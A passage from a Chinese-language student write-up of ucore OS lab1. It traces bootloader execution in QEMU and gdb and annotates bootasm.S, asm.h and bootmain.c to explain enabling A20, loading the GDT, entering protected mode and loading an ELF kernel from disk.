data) &#123;</span><br><span class="line">   393      asm volatile (&quot;outw %0, %1&quot; :: &quot;a&quot; (data), &quot;d&quot; (port));</span><br><span class="line">   394      7d68:       b8 00 8a ff ff          mov    $0xffff8a00,%eax</span><br><span class="line">   395      7d6d:       89 c2                   mov    %eax,%edx</span><br><span class="line">   396      7d6f:       66 ef                   out    %ax,(%dx)</span><br><span class="line">   397      7d71:       b8 00 8e ff ff          mov    $0xffff8e00,%eax</span><br><span class="line">   398      7d76:       66 ef                   out    %ax,(%dx)</span><br><span class="line">   399      7d78:       eb fe                   jmp    7d78 &lt;bootmain+0xa7&gt;</span><br></pre></td></tr></table></figure></div>
<p>在调用qemu 时增加-d in_asm -D q.log 参数，便可以将运行的汇编指令保存在q.log 中。</p>
<p>改写Makefile文件第220行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">debug: $(UCOREIMG)</span><br><span class="line">		$(V)$(TERMINAL) -e &quot;$(QEMU) -S -s -d in_asm -D $(BINDIR)&#x2F;q.log -parallel stdio -hda $&lt; -serial null&quot;</span><br><span class="line">		$(V)sleep 2</span><br><span class="line">		$(V)$(TERMINAL) -e &quot;gdb -q -tui -x tools&#x2F;gdbinit&quot;</span><br></pre></td></tr></table></figure></div>
<p>重新make debug</p>
<p>gdb中运行命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">b *0x7c4a</span><br><span class="line">c</span><br></pre></td></tr></table></figure></div>
<p>得到0x7c00到bootmain函数入口前(0x7c4a)的debug的汇编指令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c00:  cli</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c00:  cli</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c01:  cld</span><br><span class="line">0x00007c02:  xor    %ax,%ax</span><br><span class="line">0x00007c04:  mov    %ax,%ds</span><br><span class="line">0x00007c06:  mov    %ax,%es</span><br><span class="line">0x00007c08:  mov    %ax,%ss</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c0a:  in     $0x64,%al</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c0c:  test   $0x2,%al</span><br><span class="line">0x00007c0e:  jne    0x7c0a</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c10:  mov    $0xd1,%al</span><br><span class="line">0x00007c12:  out    %al,$0x64</span><br><span class="line">0x00007c14:  in     $0x64,%al</span><br><span class="line">0x00007c16:  test   $0x2,%al</span><br><span class="line">0x00007c18:  jne    0x7c14</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c1a:  mov    $0xdf,%al</span><br><span class="line">0x00007c1c:  out    %al,$0x60</span><br><span class="line">0x00007c1e:  lgdtw  0x7c6c</span><br><span class="line">0x00007c23:  mov    %cr0,%eax</span><br><span class="line">0x00007c26:  or     $0x1,%eax</span><br><span class="line">0x00007c2a:  mov    %eax,%cr0</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c2d:  ljmp   $0x8,$0x7c32</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c32:  mov    $0x10,%ax</span><br><span class="line">0x00007c36:  mov    %eax,%ds</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c38:  mov    %eax,%es</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c3a:  mov    %eax,%fs</span><br><span class="line">0x00007c3c:  mov    %eax,%gs</span><br><span class="line">0x00007c3e:  mov    %eax,%ss</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c40:  mov    $0x0,%ebp</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007c45:  mov    $0x7c00,%esp</span><br><span class="line">0x00007c4a:  call   0x7cd1</span><br></pre></td></tr></table></figure></div>
<p>可见三者对应且一致。</p>
<h2 id="练习2-4"><a href="#练习2-4" class="headerlink" title="练习2.4"></a>练习2.4</h2><p>设置0x7cd7为下一个断点</p>
<p>得到bootmain对应的汇编码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">----------------</span><br><span class="line">IN:</span><br><span class="line">0x00007cd1:  push   %ebp</span><br><span class="line">0x00007cd2:  mov    %esp,%ebp</span><br><span class="line">0x00007cd4:  push   %edi</span><br><span class="line">0x00007cd5:  push   %esi</span><br><span class="line">0x00007cd6:  push   %ebx</span><br><span class="line">0x00007cd7:  mov    $0x1,%ebx</span><br></pre></td></tr></table></figure></div>
<p>对应bootasm.S源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">71      call bootmain</span><br></pre></td></tr></table></figure></div>
<p>查看bootblock.asm的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">233  &#x2F;* bootmain - the entry of bootloader *&#x2F;</span><br><span class="line">234  void</span><br><span class="line">235  bootmain(void) &#123;</span><br><span class="line">236      7cd1:       55                      push   %ebp</span><br><span class="line">237      7cd2:       89 e5                   mov    %esp,%ebp</span><br><span class="line">238      7cd4:       57                      push   %edi</span><br><span class="line">239      7cd5:       56                      push   %esi</span><br><span class="line">240      7cd6:       53                      push   %ebx</span><br><span class="line">241</span><br><span class="line">242      &#x2F;&#x2F; round down to sector boundary</span><br><span class="line">243      va -&#x3D; offset % SECTSIZE;</span><br><span class="line">244</span><br><span class="line">245      &#x2F;&#x2F; translate from bytes to sectors; kernel starts at sector 1</span><br><span class="line">246      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">247      7cd7:       bb 01 00 00 00          mov    $0x1,%ebx</span><br><span class="line">248      &#125;</span><br></pre></td></tr></table></figure></div>
<p>三者对应</p>
<h1 id="练习3：分析bootloader进入保护模式的过程。"><a href="#练习3：分析bootloader进入保护模式的过程。" class="headerlink" title="练习3：分析bootloader进入保护模式的过程。"></a>练习3：分析bootloader进入保护模式的过程。</h1><p>BIOS将通过读取硬盘主引导扇区到内存，并转跳到对应内存中的位置执行bootloader。请分析bootloader是如何完成从实模式进入保护模式的。</p>
<p>提示：需要阅读<strong>小节“保护模式和分段机制”</strong>和lab1/boot/bootasm.S源码，了解如何从实模式切换到保护模式，需要了解：</p>
<ul>
<li><p>为何开启A20，以及如何开启A20</p>
</li>
<li><p>如何初始化GDT表</p>
</li>
<li><p>如何使能和进入保护模式</p>
</li>
</ul>
<h2 id="bootasm-S-源码"><a href="#bootasm-S-源码" class="headerlink" title="bootasm.S 源码"></a>bootasm.S 源码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">moocos-&gt; cat boot&#x2F;bootasm.S -n</span><br><span class="line">    1  #include &lt;asm.h&gt;</span><br><span class="line">    2  #导入asm.h头文件，用于定义GDT，GDT是保护模式使用的全局段描述表，其中存储者段描述符</span><br><span class="line">    3  # Start the CPU: switch to 32-bit protected mode, jump into C.</span><br><span class="line">    4  # The BIOS loads this code from the first sector of the hard disk into</span><br><span class="line">    5  # memory at physical address 0x7c00 and starts executing in real mode</span><br><span class="line">    6  # with %cs&#x3D;0 %ip&#x3D;7c00.</span><br><span class="line">    7  # 此处注释说明了此段代码的目的是启动保护模式，转入C。计算机加电后，由BIOS将bootasm.S生成的可执行代码从硬盘的第一个扇区复制到内存中的物理地址0x7c00处,并开始执行。此时系统处于实模式。可用内存不多于1M。</span><br><span class="line">    8  .set PROT_MODE_CSEG,        0x8                     # kernel code segment selector</span><br><span class="line">    9  .set PROT_MODE_DSEG,        0x10                    # kernel data segment selector</span><br><span class="line">    # 这两个段选择子提供了gdt中代码段和数据段的索引</span><br><span class="line">   10  .set CR0_PE_ON,             0x1                     # protected mode enable flag</span><br><span class="line">   # 此变量是开启A20地址线的标志，为1是开启保护模式</span><br><span class="line">   11</span><br><span class="line">   12  # start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">   13  .globl start</span><br><span class="line">   14  start:</span><br><span class="line">   #此处相当于C语言的main函数，是BIOS调用程序的执行入口</span><br><span class="line">   15  .code16                                             # Assemble for 16-bit mode</span><br><span class="line">   16      cli                                             # Disable interrupts </span><br><span class="line">   17      cld                                             # String operations increment #使方向标志位复位</span><br><span class="line">   18</span><br><span class="line">   19      # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">   20      xorw %ax, %ax                                   # Segment number zero #将ax清零</span><br><span class="line">   21      movw %ax, %ds                                   # -&gt; Data Segment     </span><br><span class="line">   22      movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">   23      movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line">   24 #上面三段是汇编常写的三段代码，将段选择子清零</span><br><span class="line">   25      # Enable A20:</span><br><span class="line">   26      #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">   27      #  address line 20 is tied low, so that addresses higher than</span><br><span class="line">   28      #  1MB wrap around to zero by default. This code undoes this.</span><br><span class="line">     #为了与最早的PC向后兼容，物理地址线20设置为低电平，因此高于1MB的地址默认情况下会回零。 此代码撤消了此操作。</span><br><span class="line">     # 接下来是激活保护模式</span><br><span class="line">     #由于历史原因A20地址位由键盘控制器芯片8042管理。所以要给8042发命令激活A20，8042有两个IO端口：0x60和0x64， 激活流程位： 发送0xd1命令到0x64端口 --&gt; 发送0xdf到0x60</span><br><span class="line">   29  seta20.1:</span><br><span class="line">   30      inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty). #读入数据</span><br><span class="line">   31      testb $0x2, %al</span><br><span class="line">   32      jnz seta20.1</span><br><span class="line">   33      #发送命令之前，要等待键盘输入缓冲区为空，这通过8042的状态寄存器的第2bit来观察，而状态寄存器的值可以读0x64端口得到。上面的指令的意思就是，如果状态寄存器的第2位为1，就跳到seta20.1符号处执行，知道第2位为0，代表缓冲区为空</span><br><span class="line">   34      movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</span><br><span class="line">   35      outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port</span><br><span class="line">   36  # 将数据0xd1写入0x64 IO端口</span><br><span class="line">   37  seta20.2:</span><br><span class="line">   38      inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">   39      testb $0x2, %al</span><br><span class="line">   40      jnz seta20.2</span><br><span class="line">   41</span><br><span class="line">   42      movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</span><br><span class="line">   43      outb %al, $0x60                                 # 0xdf &#x3D; 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1</span><br><span class="line">   44      #此处A20激活成功</span><br><span class="line">   45      # Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line">   46      # and segment translation that makes virtual addresses</span><br><span class="line">   47      # identical to physical addresses, so that the</span><br><span class="line">   48      # effective memory map does not change during the switch.</span><br><span class="line">   #转入保护模式，这里需要指定一个临时的GDT，来翻译逻辑（虚拟）地址。这里使用的GDT通过gdtdesc段定义。它翻译得到的物理地址和虚拟地址相同，所以转换过程中内存映射不会改变</span><br><span class="line">   49      lgdt gdtdesc #载入gdt</span><br><span class="line">   50      movl %cr0, %eax </span><br><span class="line">   51      orl $CR0_PE_ON, %eax</span><br><span class="line">   52      movl %eax, %cr0</span><br><span class="line">   53      #打开保护模式标志位，开启保护模式，cr0寄存器的第0位就是这个开关，通过CR0_PE_ON或cr0寄存器，将第0位置1</span><br><span class="line">   54      # Jump to next instruction, but in 32-bit code segment.</span><br><span class="line">   55      # Switches processor into 32-bit mode.</span><br><span class="line">   56      ljmp $PROT_MODE_CSEG, $protcseg</span><br><span class="line">   57      #开保护模式之后就要使用逻辑地址。</span><br><span class="line">   58  .code32                                             # Assemble for 32-bit mode</span><br><span class="line">   59  protcseg:</span><br><span class="line">   60      # Set up the protected-mode data segment registers</span><br><span class="line">   61      movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">   62      movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">   63      movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">   64      movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">   65      movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">   66      movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line">   67      #设置段寄存器，并建立堆栈。</span><br><span class="line">   68      # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">   69      movl $0x0, %ebp</span><br><span class="line">   70      movl $start, %esp</span><br><span class="line">   71      call bootmain</span><br><span class="line">   72#栈顶设定在start处，也就是地址0x7c00处，call函数将返回地址入栈，将控制权交给bootmain主方法</span><br><span class="line">   73      # If bootmain returns (it shouldn&#39;t), loop.</span><br><span class="line">   74  spin:</span><br><span class="line">   75      jmp spin   #死循环</span><br><span class="line">   76</span><br><span class="line">   77  # Bootstrap GDT</span><br><span class="line">   78  .p2align 2                                          # force 4 byte alignment</span><br><span class="line">   79  gdt:</span><br><span class="line">   80      SEG_NULLASM                                     # null seg</span><br><span class="line">   81      SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</span><br><span class="line">   82      SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</span><br><span class="line">   83</span><br><span class="line">   84  gdtdesc:</span><br><span class="line">   85      .word 0x17                                      # sizeof(gdt) - 1</span><br><span class="line">   86      .long gdt                                       # address gdt</span><br></pre></td></tr></table></figure></div>
<p>asm.h的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">moocos-&gt; cat boot/<span class="keyword">asm</span>.h -n</span><br><span class="line">     <span class="number">1</span>  <span class="meta">#<span class="meta-keyword">ifndef</span> __BOOT_ASM_H__</span></span><br><span class="line">     <span class="number">2</span>  <span class="meta">#<span class="meta-keyword">define</span> __BOOT_ASM_H__</span></span><br><span class="line">     <span class="number">3</span></span><br><span class="line">     <span class="number">4</span>  <span class="comment">/* Assembler macros to create x86 segments */</span></span><br><span class="line">     <span class="number">5</span></span><br><span class="line">     <span class="number">6</span>  <span class="comment">/* Normal segment */</span></span><br><span class="line">     <span class="number">7</span>  <span class="meta">#<span class="meta-keyword">define</span> SEG_NULLASM                                             \</span></span><br><span class="line">     <span class="number">8</span>      .<span class="keyword">word</span> <span class="number">0</span>, <span class="number">0</span>;                                                 \</span><br><span class="line">     <span class="number">9</span>      .<span class="keyword">byte</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="number">10</span></span><br><span class="line">    <span class="number">11</span>  <span class="meta">#<span class="meta-keyword">define</span> SEG_ASM(type,base,lim)                                  \</span></span><br><span class="line">    <span class="number">12</span>      .<span class="keyword">word</span> (((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>), ((base) &amp; <span class="number">0xffff</span>);          \</span><br><span class="line">    <span class="number">13</span>      .<span class="keyword">byte</span> (((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), (<span class="number">0x90</span> | (type)),             \</span><br><span class="line">    <span class="number">14</span>          (<span class="number">0xC0</span> | (((lim) &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>)), (((base) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="number">15</span></span><br><span class="line">    <span class="number">16</span></span><br><span class="line">    <span class="number">17</span>  <span class="comment">/* Application segment type bits */</span></span><br><span class="line">    <span class="number">18</span>  <span class="meta">#<span class="meta-keyword">define</span> STA_X       0x8     <span class="comment">// Executable segment</span></span></span><br><span class="line">    <span class="number">19</span>  <span class="meta">#<span class="meta-keyword">define</span> STA_E       0x4     <span class="comment">// Expand down (non-executable segments)</span></span></span><br><span class="line">    <span class="number">20</span>  <span class="meta">#<span class="meta-keyword">define</span> STA_C       0x4     <span class="comment">// Conforming code segment (executable only)</span></span></span><br><span class="line">    <span class="number">21</span>  <span class="meta">#<span class="meta-keyword">define</span> STA_W       0x2     <span class="comment">// Writeable (non-executable segments)</span></span></span><br><span class="line">    <span class="number">22</span>  <span class="meta">#<span class="meta-keyword">define</span> STA_R       0x2     <span class="comment">// Readable (executable segments)</span></span></span><br><span class="line">    <span class="number">23</span>  <span class="meta">#<span class="meta-keyword">define</span> STA_A       0x1     <span class="comment">// Accessed</span></span></span><br><span class="line">    <span class="number">24</span></span><br><span class="line">    <span class="number">25</span>  <span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__BOOT_ASM_H__ */</span></span></span><br><span class="line">    <span class="number">26</span></span><br></pre></td></tr></table></figure></div>
<h2 id="练习3-1"><a href="#练习3-1" class="headerlink" title="练习3.1"></a>练习3.1</h2><blockquote>
<p>为何开启A20，以及如何开启A20</p>
</blockquote>
<p>当A20地址线控制禁止时，程序就像运行在8086上，1MB以上的地址是不可访问的，只能访问奇数MB的不连续的地址。为了使能所有地址位的寻址能力，必须向键盘控制器8082发送一个命令，键盘控制器8042会将A20线置于高电位，使全部32条地址线可用，实现访问4GB内存。</p>
<p>激活方法：要给8042发命令激活A20，8042有两个IO端口：0x60和0x64， 激活流程位： 发送0xd1命令到0x64端口 —&gt; 发送0xdf到0x60</p>
<h2 id="练习3-2"><a href="#练习3-2" class="headerlink" title="练习3.2"></a>练习3.2</h2><blockquote>
<p>如何初始化GDT表</p>
</blockquote>
<p><strong>全局描述符表(GDT)</strong>的是提供内存保护。在80286之前的处理器中只有实模式，所有程序都可访问任意内存。GDT是保护模式下限制非法内存访问的一种方式。</p>
<p>直接载入gpt</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">lgdt gdtdesc #载入gdt</span><br></pre></td></tr></table></figure></div>
<h2 id="练习3-3"><a href="#练习3-3" class="headerlink" title="练习3.3"></a>练习3.3</h2><blockquote>
<p>如何使能和进入保护模式</p>
</blockquote>
<p>通过CR0_PE_ON或cr0寄存器，将第0位置1</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">50      movl %cr0, %eax </span><br><span class="line">51      orl $CR0_PE_ON, %eax</span><br><span class="line">52      movl %eax, %cr0</span><br></pre></td></tr></table></figure></div>
<h1 id="练习4：分析bootloader加载ELF格式的OS的过程。"><a href="#练习4：分析bootloader加载ELF格式的OS的过程。" class="headerlink" title="练习4：分析bootloader加载ELF格式的OS的过程。"></a>练习4：分析bootloader加载ELF格式的OS的过程。</h1><p>通过阅读bootmain.c，了解bootloader如何加载ELF文件。通过分析源代码和通过qemu来运行并调试bootloader&amp;OS，</p>
<ul>
<li>bootloader如何读取硬盘扇区的？</li>
<li>bootloader是如何加载ELF格式的OS？</li>
</ul>
<p>提示：可阅读“硬盘访问概述”，“ELF执行文件格式概述”这两小节。</p>
<h2 id="bootmain-c源码"><a href="#bootmain-c源码" class="headerlink" title="bootmain.c源码"></a>bootmain.c源码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">moocos-&gt; cat boot/bootmain.c -n</span><br><span class="line">     <span class="number">1</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line">     <span class="number">2</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86.h&gt;</span></span></span><br><span class="line">     <span class="number">3</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line">     <span class="number">4</span></span><br><span class="line">     <span class="number">5</span>   <span class="comment">/* *************************************************** **********************</span></span><br><span class="line"><span class="comment">     6 这是一个非常简单的引导加载程序，它的唯一工作就是引导</span></span><br><span class="line"><span class="comment">     7 *来自第一个IDE硬盘的ELF内核映像。</span></span><br><span class="line"><span class="comment">     8 *</span></span><br><span class="line"><span class="comment">     9 *磁盘布局</span></span><br><span class="line"><span class="comment">    10 * *该程序（bootasm.S和bootmain.c）是引导加载程序。</span></span><br><span class="line"><span class="comment">    11 *应该存储在磁盘的第一个扇区中。</span></span><br><span class="line"><span class="comment">    12 *</span></span><br><span class="line"><span class="comment">    13 * *第二个扇区开始保存内核映像。</span></span><br><span class="line"><span class="comment">    14 *</span></span><br><span class="line"><span class="comment">    15 * *内核映像必须为ELF格式。</span></span><br><span class="line"><span class="comment">    16 *</span></span><br><span class="line"><span class="comment">    17 *启动步骤</span></span><br><span class="line"><span class="comment">    18 * *当CPU启动时，它将BIOS加载到内存中并执行</span></span><br><span class="line"><span class="comment">    19 *</span></span><br><span class="line"><span class="comment">    20 * * BIOS初始化设备，中断例程集以及</span></span><br><span class="line"><span class="comment">    21 *读取引导设备的第一个扇区（例如，硬盘驱动器）</span></span><br><span class="line"><span class="comment">    22 *进入内存并跳转到它。</span></span><br><span class="line"><span class="comment">    23 *</span></span><br><span class="line"><span class="comment">    24 * *假设此引导加载程序存储在磁盘的第一个扇区中</span></span><br><span class="line"><span class="comment">    25 *硬盘，此代码接管...</span></span><br><span class="line"><span class="comment">    26 *</span></span><br><span class="line"><span class="comment">    27 * *控制从bootasm.S开始-设置保护模式，</span></span><br><span class="line"><span class="comment">    28 *和一个堆栈，然后运行C代码，然后调用bootmain（）</span></span><br><span class="line"><span class="comment">    29 *</span></span><br><span class="line"><span class="comment">    该文件中的30 * * bootmain（）接管，读取内核并跳转到该内核。</span></span><br><span class="line"><span class="comment">    31 * */</span></span><br><span class="line">    <span class="number">32</span></span><br><span class="line">    <span class="number">33</span>  <span class="meta">#<span class="meta-keyword">define</span> SECTSIZE        512</span></span><br><span class="line">    <span class="number">34</span>  <span class="meta">#<span class="meta-keyword">define</span> ELFHDR          ((struct elfhdr *)0x10000)      <span class="comment">//暂存空间</span></span></span><br><span class="line">    <span class="number">35</span></span><br><span class="line">    <span class="number">36</span>  <span class="comment">/* waitdisk-等待磁盘就绪 */</span></span><br><span class="line">    <span class="number">37</span>  <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">    <span class="number">38</span>  waitdisk(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="number">39</span>      <span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>)</span><br><span class="line">    <span class="number">40</span>          <span class="comment">/* do nothing */</span>;</span><br><span class="line">    <span class="number">41</span>  &#125;</span><br><span class="line">    <span class="number">42</span></span><br><span class="line">    <span class="number">43</span>  <span class="comment">/* readsect-将@secno的单个扇区读入@dst */</span></span><br><span class="line">    <span class="number">44</span>  <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">    <span class="number">45</span>  readsect(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno) &#123;</span><br><span class="line">    <span class="number">46</span>      <span class="comment">//等待磁盘准备好</span></span><br><span class="line">    <span class="number">47</span>      waitdisk();</span><br><span class="line">    <span class="number">48</span></span><br><span class="line">    <span class="number">49</span>      outb(<span class="number">0x1F2</span>, <span class="number">1</span>);                         <span class="comment">// count = 1</span></span><br><span class="line">    <span class="number">50</span>      outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line">    <span class="number">51</span>      outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    <span class="number">52</span>      outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    <span class="number">53</span>      outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line">    <span class="number">54</span>      outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);                      <span class="comment">// cmd 0x20 - read 读取扇区</span></span><br><span class="line">    <span class="number">55</span></span><br><span class="line">    <span class="number">56</span>      <span class="comment">//等待磁盘准备好</span></span><br><span class="line">    <span class="number">57</span>      waitdisk();</span><br><span class="line">    <span class="number">58</span></span><br><span class="line">    <span class="number">59</span>      <span class="comment">//读一个扇区</span></span><br><span class="line">    <span class="number">60</span>      insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">    <span class="number">61</span>  &#125;</span><br><span class="line">    <span class="number">62</span></span><br><span class="line">    <span class="number">63</span>  <span class="comment">/* *</span></span><br><span class="line"><span class="comment">    64 * readseg-从内核将@count处的@count字节读取到虚拟地址@va中，</span></span><br><span class="line"><span class="comment">    65 *可能会复印超过要求的数量。</span></span><br><span class="line"><span class="comment">    66 * */</span></span><br><span class="line">    <span class="number">67</span>  <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">    <span class="number">68</span>  readseg(<span class="keyword">uintptr_t</span> va, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset) &#123;</span><br><span class="line">    <span class="number">69</span>      <span class="keyword">uintptr_t</span> end_va = va + count;</span><br><span class="line">    <span class="number">70</span></span><br><span class="line">    <span class="number">71</span>      <span class="comment">//向下舍入到扇区边界</span></span><br><span class="line">    <span class="number">72</span>      va -= offset % SECTSIZE;</span><br><span class="line">    <span class="number">73</span></span><br><span class="line">    <span class="number">74</span>      <span class="comment">//从字节转换为扇区;内核从扇区1开始</span></span><br><span class="line">    <span class="number">75</span>      <span class="keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="number">1</span>;</span><br><span class="line">    <span class="number">76</span>		<span class="comment">//如果太慢，我们可以一次读取很多扇区。</span></span><br><span class="line">    <span class="number">78</span>       <span class="comment">//我们向内存中写入的内容超出了要求，但这没关系-</span></span><br><span class="line">    <span class="number">79</span>       <span class="comment">//我们按升序加载。</span></span><br><span class="line">    <span class="number">80</span>      <span class="keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;</span><br><span class="line">    <span class="number">81</span>          readsect((<span class="keyword">void</span> *)va, secno);</span><br><span class="line">    <span class="number">82</span>      &#125;</span><br><span class="line">    <span class="number">83</span>  &#125;</span><br><span class="line">    <span class="number">84</span></span><br><span class="line">    <span class="number">85</span>  <span class="comment">/* bootmain-引导加载程序的条目*/</span></span><br><span class="line">    <span class="number">86</span>  <span class="keyword">void</span></span><br><span class="line">    <span class="number">87</span>  bootmain(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="number">88</span>      <span class="comment">// 首先读取ELF的头部</span></span><br><span class="line">    <span class="number">89</span>      readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="number">90</span></span><br><span class="line">    <span class="number">91</span>       <span class="comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span></span><br><span class="line">    <span class="number">92</span>      <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">    <span class="number">93</span>          <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="number">94</span>      &#125;</span><br><span class="line">    <span class="number">95</span></span><br><span class="line">    <span class="number">96</span>      <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line">    <span class="number">97</span></span><br><span class="line">    <span class="number">98</span>      <span class="comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表, 先将描述表的头地址存在ph</span></span><br><span class="line">    <span class="number">99</span>      ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">   <span class="number">100</span>      eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">            <span class="comment">// 按照描述表将ELF文件中数据载入内存</span></span><br><span class="line">   <span class="number">101</span>      <span class="keyword">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">   <span class="number">102</span>          readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">   <span class="number">103</span>      &#125;</span><br><span class="line">           <span class="comment">// 